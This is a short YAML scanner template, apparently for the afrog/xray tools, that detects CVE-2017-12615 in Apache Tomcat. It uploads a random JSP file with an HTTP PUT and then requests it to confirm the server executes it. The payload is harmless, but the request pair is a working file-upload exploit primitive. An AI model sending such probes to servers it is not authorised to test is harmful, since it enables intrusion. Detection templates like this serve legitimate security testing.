id: CVE-2017-12615

info:
  name: Apache Tomcat 的远程代码执行漏洞
  author: zan8in
  severity: critical
  verified: true

set:
  filename: randomLowercase(6)
  verifyStr: randomLowercase(12)
  commentStr: randomLowercase(12)
rules:
  r0:
    request:
      method: PUT
      path: /{{filename}}.jsp/
      body: "{{verifyStr}} <%-- {{commentStr}} --%>"
    expression: response.status == 201
  r1:
    request:
      method: GET
      path: /{{filename}}.jsp
    expression: response.status == 200 && response.body.bcontains(bytes(verifyStr)) && !response.body.bcontains(bytes(commentStr))
expression: r0() && r1()
